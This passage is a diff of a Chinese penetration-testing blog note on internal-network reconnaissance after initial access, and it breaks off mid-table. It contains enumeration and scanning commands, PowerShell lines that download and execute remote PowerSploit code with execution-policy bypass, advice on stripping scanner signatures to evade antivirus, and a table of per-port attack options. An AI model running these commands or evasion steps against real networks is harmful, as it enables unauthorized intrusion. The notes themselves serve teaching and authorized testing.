@@ -4,7 +4,7 @@
 <head>
     <meta charset="utf-8">
     
-    <title>内网学习笔记一 | 内网信息搜集 | RainMaker</title>
+    <title>内网学习笔记二 | 内网信息搜集 | RainMaker</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
     
@@ -131,7 +131,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckz2v4t78006u3o4z42nm61e6" class="article article-type-post" itemscope
+    <article id="post-cl43rsujg0000v25ycrbma5hq" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -147,7 +147,7 @@
             
   
     <h1 class="article-title" itemprop="name">
-      内网学习笔记一 | 内网信息搜集
+      内网学习笔记二 | 内网信息搜集
     </h1>
   
 
@@ -181,11 +181,12 @@
         </div>
 
         <div class="article-entry post-inner-html hairline" itemprop="articleBody">
-            <h2 id="2-1-内网信息搜集概述"><a href="#2-1-内网信息搜集概述" class="headerlink" title="2.1 内网信息搜集概述"></a>2.1 内网信息搜集概述</h2><p>我是谁?   一对当前机器角色的判断。</p>
+            <p>内网渗透测试与常规的渗透测试是截然不同的。内网渗透测试的需求是，获取内网中特定用户或机器的权限，进而获得特定的资源，对内网的安全性进行评估。</p>
+<h2 id="2-1-内网信息搜集概述"><a href="#2-1-内网信息搜集概述" class="headerlink" title="2.1 内网信息搜集概述"></a>2.1 内网信息搜集概述</h2><span id="more"></span>
+
+<p>我是谁?   一对当前机器角色的判断。</p>
 <p>这是哪?   一对当前机器所处网络环境的拓扑结构进行分析和判断。</p>
 <p>我在哪?   一对当前机器所处区域的判断。</p>
-<span id="more"></span>
-
 <h2 id="2-2-收集本机信息"><a href="#2-2-收集本机信息" class="headerlink" title="2. 2 收集本机信息"></a>2. 2 收集本机信息</h2><p>本机信息：操作系统、权限、内网IP段、杀毒软件、端口、服务、补丁更新频率、网络连接、共享、会话等。</p>
 <h3 id="2-2-1-手动搜集信息"><a href="#2-2-1-手动搜集信息" class="headerlink" title="2.2.1 手动搜集信息"></a>2.2.1 手动搜集信息</h3><pre><code class="hljs powershell"><span class="hljs-comment">#查询网络配置信息</span>
 ipconfig    /all
@@ -341,7 +342,7 @@ regedit /s a.reg</code></pre>
 <h3 id="2-2-3-通过Empire的信息搜集模块"><a href="#2-2-3-通过Empire的信息搜集模块" class="headerlink" title="2.2.3 通过Empire的信息搜集模块"></a>2.2.3 通过Empire的信息搜集模块</h3><p>可以参考博文：<a href="https://hasaki-h2.github.io/f0bfc07b.html">Empire-配置安装和基本使用</a></p>
 <p><code>usemodule situational_awareness/host/winenum</code></p>
 <p><code>usemodule situational_awareness/host/computerdetails</code></p>
-<p>​    <img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211210203228598.png"></p>
+<p>​    <img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20211210203228598.png"></p>
 <h2 id="2-3-查询当前权限"><a href="#2-3-查询当前权限" class="headerlink" title="2.3 查询当前权限"></a>2.3 查询当前权限</h2><h3 id="1-查看当前权限"><a href="#1-查看当前权限" class="headerlink" title="1.查看当前权限"></a>1.查看当前权限</h3><pre><code class="hljs powershell">whoami</code></pre>
 
 <ul>
@@ -355,7 +356,7 @@ regedit /s a.reg</code></pre>
 
 <p>当前域test.com的SID为：S-1-5-21-636858252-868354219-2394751447</p>
 <p>域用户zs的SID为：S-1-5-21-636858252-868354219-2394751447-1111</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220112130243601.png" alt="image-20220112130243601"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112130243601.png" alt="image-20220112130243601"></p>
 <h3 id="3-查询指定用户的详细信息"><a href="#3-查询指定用户的详细信息" class="headerlink" title="3.查询指定用户的详细信息"></a>3.查询指定用户的详细信息</h3><pre><code class="hljs plaintext">net user XXX /domain</code></pre>
 
 <p>可以查询到当前用户的权限，组，登录时间等信息。</p>
@@ -374,16 +375,16 @@ nslookup test.com</code></pre>
 
 <p>存在域，但当前用户不是域用户。</p>
 <p>存在域，且当前用户是域用户。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220112134922646.png" alt="image-20220112134922646"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112134922646.png" alt="image-20220112134922646"></p>
 <p>不存在域，当前网络环境为工作组。</p>
 <p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220112134931825.png" alt="image-20220112134931825"></p>
 <h2 id="2-5-探测域内存活主机"><a href="#2-5-探测域内存活主机" class="headerlink" title="2.5. 探测域内存活主机"></a>2.5. 探测域内存活主机</h2><h3 id="2-5-1-利用NetBIOS快速探测内网"><a href="#2-5-1-利用NetBIOS快速探测内网" class="headerlink" title="2.5.1 利用NetBIOS快速探测内网"></a>2.5.1 利用NetBIOS快速探测内网</h3><p> NetBIOS是局域网程序使用的一种应用程序编程接口（API），为程序提供了请求低级别服务 的统一的命令集，为局域网提供了网络及其他特殊功能。几乎所有的局域网都是在NetBIOS协议 的基础上工作的。NetBIOS也是计算机的标识名，主要用于局域网中计算机的互访。NetBIOS的 工作流程就是正常的机器名解析查询应答过程，因此推荐优先使用。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/3b292df5e0fe9925bc31581f48f849df8db1cb13db66" alt="img"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/3b292df5e0fe9925bc31581f48f849df8db1cb13db66" alt="img"></p>
 <p>nbtscan是—个命令行工具，用于扫描本地或远程 TCP/IP 网络上的开放 NetBIOS 名称服务器。nbtscan有Windows和Linux两个版本，体积小，不需要安装特殊的库或DLL就能使用。</p>
 <p>repo：</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/scallywag/nbtscan">https://github.com/scallywag/nbtscan</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/lifenjoiner/nbtscan">https://github.com/lifenjoiner/nbtscan</a></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220112142228726.png" alt="image-20220112142228726"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112142228726.png" alt="image-20220112142228726"></p>
 <p>第—列为IP地址，第二列为机器名和所在域的名称，最后一列是机器所开启的服务的列表，具体含义如表所示：</p>
 <table>
 <thead>
@@ -423,7 +424,7 @@ nslookup test.com</code></pre>
 </tbody></table>
 <h3 id="2-5-2-利用ICMP协议快速探测内网"><a href="#2-5-2-利用ICMP协议快速探测内网" class="headerlink" title="2.5.2 利用ICMP协议快速探测内网"></a>2.5.2 利用ICMP协议快速探测内网</h3><pre><code class="hljs powershell"><span class="hljs-keyword">for</span> /L %I <span class="hljs-keyword">in</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">254</span>) <span class="hljs-keyword">DO</span> @ping <span class="hljs-literal">-w</span> <span class="hljs-number">1</span> <span class="hljs-literal">-n</span> <span class="hljs-number">1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2</span>.%I | findstr <span class="hljs-string">&quot;TTL=&quot;</span></code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220112144310180.png" alt="image-20220112144310180"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112144310180.png" alt="image-20220112144310180"></p>
 <p>需要修改IP地址段以及保存结果的路径（默认保存在<code>C:\Windows\Temp\Result.txt</code>），VBS脚本如下：</p>
 <pre><code class="hljs vbscript">strSubNet = <span class="hljs-string">&quot;192.168.0.&quot;</span>
 <span class="hljs-keyword">Set</span> objFSO= <span class="hljs-built_in">CreateObject</span>(<span class="hljs-string">&quot;Scripting.Filesystemobject&quot;</span>)
@@ -454,28 +455,28 @@ Ping = <span class="hljs-literal">False</span>
 <p>运行：</p>
 <pre><code class="hljs powershell">cscript host<span class="hljs-literal">-scan</span>.vbs</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220112232902425.png" alt="image-20220112232902425"></p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220113013129248.png" alt="image-20220113013129248"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220112232902425.png" alt="image-20220112232902425"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113013129248.png" alt="image-20220113013129248"></p>
 <h3 id="2-5-3-通过ARP扫描探测内网"><a href="#2-5-3-通过ARP扫描探测内网" class="headerlink" title="2.5.3 通过ARP扫描探测内网"></a>2.5.3 通过ARP扫描探测内网</h3><h4 id="1-arp-scan工具"><a href="#1-arp-scan工具" class="headerlink" title="1. arp-scan工具"></a>1. arp-scan工具</h4><p>repo:</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/QbsuranAlang/arp-scan-windows-">https://github.com/QbsuranAlang/arp-scan-windows-</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/royhills/arp-scan/releases/tag/1.9">https://github.com/royhills/arp-scan/releases/tag/1.9</a></p>
 <p>打包需要修改<code>msvcbuild.bat</code> 文件中的<code>vcvarsall.bat</code>的路径。</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220113001042955.png" alt="image-20220113001042955"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113001042955.png" alt="image-20220113001042955"></p>
 <p>用法：</p>
 <pre><code class="hljs powershell">arp<span class="hljs-literal">-scan</span>.exe <span class="hljs-literal">-t</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span>/<span class="hljs-number">24</span></code></pre>
 
 <p>扫描结果如下：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220113022642792.png" alt="image-20220113022642792"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113022642792.png" alt="image-20220113022642792"></p>
 <h4 id="2-Empire中的arpscan模块"><a href="#2-Empire中的arpscan模块" class="headerlink" title="2. Empire中的arpscan模块"></a>2. Empire中的arpscan模块</h4><p>repo:<a target="_blank" rel="noopener" href="https://github.com/EmpireProject/Empire/releases/tag/2.5">https://github.com/EmpireProject/Empire/releases/tag/2.5</a></p>
 <pre><code class="hljs shell">usemodule powershell/situational_awareness/network/arpscan</code></pre>
 
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220113022020793.png" alt="image-20220113022020793"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113022020793.png" alt="image-20220113022020793"></p>
 <h4 id="3-Nishang中的Invoke-ARPScan-ps1脚本"><a href="#3-Nishang中的Invoke-ARPScan-ps1脚本" class="headerlink" title="3. Nishang中的Invoke-ARPScan.ps1脚本"></a>3. Nishang中的<code>Invoke-ARPScan.ps1</code>脚本</h4><p>repo:<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang/releases">https://github.com/samratashok/nishang/releases</a></p>
 <p>通外网的话可以直接远程加载，否则的话就上传到目标服务器中运行。并没有在Nishang中发现该脚本，但是在Empire中发现了该PS1脚本。</p>
 <pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;&amp; &#123;Import-Module C:\test\Invoke-ARPScan.ps1; Invoke-ARPScan -CIDR 192.168.2.0/24&#125;&quot;</span> &gt;&gt; C:\test\log.txt</code></pre>
 
 <p>执行结果如下：</p>
-<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220113024355457.png" alt="image-20220113024355457"></p>
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/images-master/image-20220113024355457.png" alt="image-20220113024355457"></p>
 <h3 id="2-5-4-通过常规TCP-UDP端口扫描探测内网"><a href="#2-5-4-通过常规TCP-UDP端口扫描探测内网" class="headerlink" title="2.5.4 通过常规TCP/UDP端口扫描探测内网"></a>2.5.4 通过常规TCP/UDP端口扫描探测内网</h3><p>ScanLine 是—款经典的端口扫描工具，可以在所有版本的Windows操作系统中使用，体积小，仅使用单个文件，同时支持TCP／UDP 端口扫描，命令如下：</p>
 <pre><code class="hljs powershell">scanline <span class="hljs-literal">-ht</span> <span class="hljs-number">21</span><span class="hljs-literal">-23</span>,<span class="hljs-number">25</span>,<span class="hljs-number">80</span><span class="hljs-literal">-89</span>,<span class="hljs-number">110</span>,<span class="hljs-number">135</span><span class="hljs-literal">-139</span>,<span class="hljs-number">143</span>,<span class="hljs-number">389</span>,<span class="hljs-number">443</span>,<span class="hljs-number">445</span>,<span class="hljs-number">1099</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">1521</span>,<span class="hljs-number">2049</span>,<span class="hljs-number">3306</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">5432</span>,<span class="hljs-number">5556</span>,<span class="hljs-number">5631</span>,<span class="hljs-number">5900</span>,<span class="hljs-number">6379</span>,<span class="hljs-number">7001</span>,<span class="hljs-number">8080</span> <span class="hljs-literal">-hu</span> <span class="hljs-number">53</span>,<span class="hljs-number">161</span>,<span class="hljs-number">137</span>,<span class="hljs-number">139</span> <span class="hljs-literal">-O</span> c:\test\log.txt <span class="hljs-literal">-p</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span><span class="hljs-literal">-254</span> /b</code></pre>
 
@@ -595,7 +596,826 @@ timeout /NOBREAK /t <span class="hljs-number">35</span> &gt;<span class="hljs-bu
 
 
 
-<h3 id="2-6-2-S扫描器"><a href="#2-6-2-S扫描器" class="headerlink" title="2.6.2 S扫描器"></a>2.6.2 S扫描器</h3><h3 id="2-6-3-Metasploit端口扫描"><a href="#2-6-3-Metasploit端口扫描" class="headerlink" title="2.6.3 Metasploit端口扫描"></a>2.6.3 Metasploit端口扫描</h3><h3 id="2-6-4-PowerSploit-的-Invoke-portscan-ps1-脚本"><a href="#2-6-4-PowerSploit-的-Invoke-portscan-ps1-脚本" class="headerlink" title="2.6.4 PowerSploit 的 Invoke-portscan.ps1 脚本"></a>2.6.4 PowerSploit 的 Invoke-portscan.ps1 脚本</h3><h3 id="2-6-5-Nishang-的-Invoke-Portscan-模块"><a href="#2-6-5-Nishang-的-Invoke-Portscan-模块" class="headerlink" title="2.6.5 Nishang 的 Invoke-Portscan 模块"></a>2.6.5 Nishang 的 Invoke-Portscan 模块</h3><h3 id="2-6-6-端口的banner信息"><a href="#2-6-6-端口的banner信息" class="headerlink" title="2.6.6 端口的banner信息"></a>2.6.6 端口的banner信息</h3><h2 id="2-7-搜集域内基础信息"><a href="#2-7-搜集域内基础信息" class="headerlink" title="2.7 搜集域内基础信息"></a>2.7 搜集域内基础信息</h2><h2 id="2-8-查找域控制器"><a href="#2-8-查找域控制器" class="headerlink" title="2.8 查找域控制器"></a>2.8 查找域控制器</h2><h2 id="2-9-获取域内的用户和管理员信息"><a href="#2-9-获取域内的用户和管理员信息" class="headerlink" title="2.9 获取域内的用户和管理员信息"></a>2.9 获取域内的用户和管理员信息</h2><h2 id="2-10-定位域管理员"><a href="#2-10-定位域管理员" class="headerlink" title="2.10 定位域管理员"></a>2.10 定位域管理员</h2><h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><h2 id="2-12-域管理员方法模拟简介"><a href="#2-12-域管理员方法模拟简介" class="headerlink" title="2.12 域管理员方法模拟简介"></a>2.12 域管理员方法模拟简介</h2><h2 id="2-13-利用power-shell收集域内信息"><a href="#2-13-利用power-shell收集域内信息" class="headerlink" title="2.13 利用power shell收集域内信息"></a>2.13 利用power shell收集域内信息</h2><h2 id="2-14-域分析工具-Blood-Hound"><a href="#2-14-域分析工具-Blood-Hound" class="headerlink" title="2.14 域分析工具 Blood Hound"></a>2.14 域分析工具 Blood Hound</h2><h2 id="2-15-敏感数据的防护"><a href="#2-15-敏感数据的防护" class="headerlink" title="2.15 敏感数据的防护"></a>2.15 敏感数据的防护</h2><h2 id="2-16-分析内网段划分情况以及拓扑结构"><a href="#2-16-分析内网段划分情况以及拓扑结构" class="headerlink" title="2.16 分析内网段划分情况以及拓扑结构"></a>2.16 分析内网段划分情况以及拓扑结构</h2>
+<h3 id="2-6-2-S扫描器"><a href="#2-6-2-S扫描器" class="headerlink" title="2.6.2 S扫描器"></a>2.6.2 S扫描器</h3><p>Repo: <a target="_blank" rel="noopener" href="https://github.com/kingron/s">https://github.com/kingron/s</a></p>
+<pre><code class="hljs bash">s.exe TCPSYN Start IP [End IP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]
+Eg-1: s.exe TCP 192.168.0.1 192.168.0.254 80 512
+Eg-2: s.exe TCP 192.168.0.1/24 80 512
+Eg-3: s.exe TCP 192.168.0.1/24 80 512 /T8 /Save
+Eg-4: s.exe TCP 192.168.0.1 192.168.0.254 80 512 /HBanner
+Eg-5: s.exe TCP 192.168.0.1 192.168.0.254 21 512 /Banner
+Eg-6: s.exe TCP 192.168.0.1 1-65535 512
+Eg-7: s.exe TCP 192.168.0.1 192.168.0.254 21,3389,5631 512
+Eg-8: s.exe TCP 192.168.0.1 21,3389,5631 512
+Eg-9: s.exe SYN 192.168.0.1 192.168.0.254 80
+Eg-10: s.exe SYN 192.168.0.1 1-65535
+Eg-11: s.exe SYN 192.168.0.1 192.168.0.254 21,80,3389
+Eg-12: s.exe SYN 192.168.0.1 21,80,3389</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220410224123078.png" alt="image-20220410224123078"></p>
+<p>需要对特征进行擦除，否则过不了杀软，例如：printf函数的几个输出值、注释内容。面杀打包后的s.exe：</p>
+<p>repo：<a target="_blank" rel="noopener" href="https://github.com/SevenC-base/PostExploitation/blob/master/windows/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/s.exe">https://github.com/SevenC-base/PostExploitation/blob/master/windows/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/s.exe</a></p>
+<p>内网扫描不建议使用，可能导致断网，参考文章：<a target="_blank" rel="noopener" href="https://f5.pm/go-78126.html%E3%80%82">https://f5.pm/go-78126.html。</a></p>
+<h3 id="2-6-3-Metasploit端口扫描"><a href="#2-6-3-Metasploit端口扫描" class="headerlink" title="2.6.3 Metasploit端口扫描"></a>2.6.3 Metasploit端口扫描</h3><p>Metasploit不仅提供了多种端口扫描技术，还提供了与其他扫描工具的接口。kali中运行如下命令：</p>
+<pre><code class="hljs bash">$ msfconsole
+msf6 &gt; search portscan
+msf6 &gt; use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> rhosts 192.168.0.1/24
+rhosts =&gt; 192.168.0.1/24
+msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> ports 1-1024
+ports =&gt; 1-1024
+msf6 auxiliary(scanner/portscan/tcp) &gt; <span class="hljs-built_in">set</span> threads 50
+threads =&gt; 50
+msf6 auxiliary(scanner/portscan/tcp) &gt; run</code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413213705601.png" alt="image-20220413213705601"></p>
+<h3 id="2-6-4-PowerSploit-的-Invoke-portscan-ps1-脚本"><a href="#2-6-4-PowerSploit-的-Invoke-portscan-ps1-脚本" class="headerlink" title="2.6.4 PowerSploit 的 Invoke-portscan.ps1 脚本"></a>2.6.4 PowerSploit 的 Invoke-portscan.ps1 脚本</h3><p><code>PowerSploit</code>的 <code>Invoke-Portscan.psl</code> 脚本，推荐使用无文件的形式进行扫描，远程加载执行:</p>
+<pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-nop</span> <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-c</span> <span class="hljs-string">&quot;IEX (New-object Net.Webclient).Downloadstring(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.0.1/24 -T4 -ports &#x27;3389,80&#x27; -oA c:\windows\temp\res.txt&quot;</span></code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413215248868.png" alt="image-20220413215248868"></p>
+<h3 id="2-6-5-Nishang-的-Invoke-Portscan-模块"><a href="#2-6-5-Nishang-的-Invoke-Portscan-模块" class="headerlink" title="2.6.5 Nishang 的 Invoke-Portscan 模块"></a>2.6.5 Nishang 的 Invoke-Portscan 模块</h3><p><code>Invoke-PortScan</code>是 <code>Nishang</code> 的端口扫描模块，用于发现主机、解析主机名、扫描端口，是一个很实用的模块。输入<code>Get-Help Invoke-PortScan-full</code> 命令，即可查看帮助信息。<code>Invoke-PortScan</code>的参数介绍如下。</p>
+<ul>
+<li><p>StartAddress: 扫描范围的开始地址。</p>
+</li>
+<li><p>EndAddress: 扫描范围的结束地址。</p>
+</li>
+<li><p>ScanPort: 进行端口扫描。</p>
+</li>
+<li><p>Port: 指定扫描端口。<br>默认扫描的端口有21、22、23、53、69、71、80、98、110、139、111、389、443、445、1080、1433、2001、2049、3001、3128、5222、6667、6868、7777、7878、8080、1521、3306、3389、5801、5900、5555、5901。</p>
+</li>
+<li><p>TimeOut:设置超时时间。</p>
+</li>
+</ul>
+<p>使用以下命令对本地局域网进行扫描，搜索存活主机并解析主机名。</p>
+<pre><code class="hljs powershell"><span class="hljs-comment"># ResolveHost参数存在异常报错</span>
+<span class="hljs-built_in">Invoke-Portscan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.255</span> <span class="hljs-literal">-ResolveHost</span>
+<span class="hljs-comment"># 不使用ResolveHost</span>
+<span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.WebClient).DownloadString(<span class="hljs-string">&quot;Invoke-Portscan.ps1&quot;</span>);<span class="hljs-built_in">Invoke-PortScan</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.254</span></code></pre>
+
+<p><img src="https://adse1231315123asdagthyrrxx.oss-cn-shanghai.aliyuncs.com/image-20220413221639837.png" alt="image-20220413221639837"></p>
+<h3 id="2-6-6-端口的banner信息"><a href="#2-6-6-端口的banner信息" class="headerlink" title="2.6.6 端口的banner信息"></a>2.6.6 端口的banner信息</h3><p>如果通过扫描发现了端口，可以使用客户端连接工具或者nc,获取服务端的Banner信息。获取Banner信息后，可以在漏洞库中查找对应CVE编号的POC、EXP,在ExploitDB、Seebug等平台上查看相关的漏洞利用工具，然后到目标系统中验证漏洞是否存在，从而有针对性地进行安全加固。相关漏洞的信息，可以参考如下两个网站。</p>
+<ul>
+<li><p>安全焦点：其中的 BugTraq 是一个出色的漏洞和Exploit数据源，可以通过 CVE 编号或者产品信息漏洞直接搜索。</p>
+</li>
+<li><p>Exploit-DB：取代了老牌安全网站milw0rm，提供了大量的 Exploit 程序和相关报告。</p>
+</li>
+<li><p>网安-Vuln-DB：网安漏洞平台汇集了 CNNVD-国家信息安全漏洞库 CNVD-国家信息安全漏洞共享平台 CICSVD-国家工业信息安全漏洞库等信息。</p>
+<p><a target="_blank" rel="noopener" href="https://vul.wangan.com/">https://vul.wangan.com/</a></p>
+</li>
+</ul>
+<p><strong>文件共享服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">21、22、69</td>
+<td>FTP/TFTP文件传输协议</td>
+<td>允许匿名的上传、下载、爆破、嗅探操作</td>
+</tr>
+<tr>
+<td align="left">2049</td>
+<td>NFS服务</td>
+<td>配置不当</td>
+</tr>
+<tr>
+<td align="left">139</td>
+<td>SAMBA服务</td>
+<td>爆破、未授权访问、远程代码执行</td>
+</tr>
+<tr>
+<td align="left">389</td>
+<td>LDAP目录访问协议</td>
+<td>注入、允许匿名的访问、弱口令</td>
+</tr>
+</tbody></table>
+<p><strong>远程连接服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">22</td>
+<td>SSH远程连接</td>
+<td>爆破、ssh隧道以及内网代理转发、文件传输</td>
+</tr>
+<tr>
+<td align="left">23</td>
+<td>Telnet远程连接</td>
+<td>爆破、嗅探、弱口令</td>
+</tr>
+<tr>
+<td align="left">3389</td>
+<td>RDP远程桌面连接</td>
+<td>Shift后门（Windows Server 2003以下版本）、爆破</td>
+</tr>
+<tr>
+<td align="left">5900</td>
+<td>VNC</td>
+<td>弱口令爆破</td>
+</tr>
+<tr>
+<td align="left">5632</td>
+<td>PcAnywhere 服务</td>
+<td>抓取密码、代码执行</td>
+</tr>
+</tbody></table>
+<p><strong>Web应用服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">80、443、8080</td>
+<td>常见Web服务端口</td>
+<td>Web攻击、爆破、对应服务器版本漏洞</td>
+</tr>
+<tr>
+<td align="left">7001、7002</td>
+<td>Weblogic控制台</td>
+<td>Java 反序列化、弱口令</td>
+</tr>
+<tr>
+<td align="left">8080、8089</td>
+<td>JBoss/Resin/Jetty/Jenkins</td>
+<td>反序列化、控制台弱口令</td>
+</tr>
+<tr>
+<td align="left">9090</td>
+<td>WebSphere控制台</td>
+<td>Java反序列化、弱口令</td>
+</tr>
+<tr>
+<td align="left">4848</td>
+<td>GlassFish控制台</td>
+<td>弱口令</td>
+</tr>
+<tr>
+<td align="left">1352</td>
+<td>Lotus Domino邮件服务</td>
+<td>弱口令、信息泄露、爆破</td>
+</tr>
+<tr>
+<td align="left">10000</td>
+<td>Webmin控制面板</td>
+<td>弱口令</td>
+</tr>
+</tbody></table>
+<p><strong>数据库服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">3306</td>
+<td>MySQL数据库</td>
+<td>注入、提权、爆破</td>
+</tr>
+<tr>
+<td align="left">1433</td>
+<td>MSSQL数据库</td>
+<td>注入、提权、SA弱口令、爆破</td>
+</tr>
+<tr>
+<td align="left">1521</td>
+<td>Oracle数据库</td>
+<td>TNS爆破、注入、反弹shell</td>
+</tr>
+<tr>
+<td align="left">5432</td>
+<td>PostgreSQL数据库</td>
+<td>爆破、注入、弱口令</td>
+</tr>
+<tr>
+<td align="left">27017、27018</td>
+<td>MongoDB数据库</td>
+<td>爆破、未授权访问</td>
+</tr>
+<tr>
+<td align="left">6379</td>
+<td>Redis数据库</td>
+<td>爆破、未授权访问、反弹shell</td>
+</tr>
+<tr>
+<td align="left">5000</td>
+<td>Sysbase/DB2数据库</td>
+<td>爆破、注入</td>
+</tr>
+</tbody></table>
+<p><strong>邮件服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">25</td>
+<td>SMTP邮件服务</td>
+<td>邮件伪造</td>
+</tr>
+<tr>
+<td align="left">110</td>
+<td>POP3协议</td>
+<td>爆破、嗅探</td>
+</tr>
+<tr>
+<td align="left">143</td>
+<td>IMAP协议</td>
+<td>爆破、嗅探</td>
+</tr>
+</tbody></table>
+<p><strong>网络常见协议端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">53</td>
+<td>DNS域名服务</td>
+<td>允许区域传送、DNS劫持、缓存投毒、欺骗</td>
+</tr>
+<tr>
+<td align="left">67、68</td>
+<td>DHCP服务</td>
+<td>劫持、欺骗</td>
+</tr>
+<tr>
+<td align="left">161</td>
+<td>SNMP协议</td>
+<td>爆破、搜集目标内网信息</td>
+</tr>
+</tbody></table>
+<p><strong>特殊服务端口</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">端口号</th>
+<th>端口说明</th>
+<th>使用说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">2181</td>
+<td>ZooKeeper.服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td align="left">8069</td>
+<td>Zabbix服务</td>
+<td>远程执行、SQL注入</td>
+</tr>
+<tr>
+<td align="left">9200、9300</td>
+<td>Elasticsearch服务</td>
+<td>远程执行</td>
+</tr>
+<tr>
+<td align="left">11211</td>
+<td>Memcached服务</td>
+<td>未授权访问</td>
+</tr>
+<tr>
+<td align="left">512、513、514</td>
+<td>Linux rexec服务</td>
+<td>爆破、远程登录</td>
+</tr>
+<tr>
+<td align="left">873</td>
+<td>rsync服务</td>
+<td>匿名访问、文件上传</td>
+</tr>
+<tr>
+<td align="left">3690</td>
+<td>SVN服务</td>
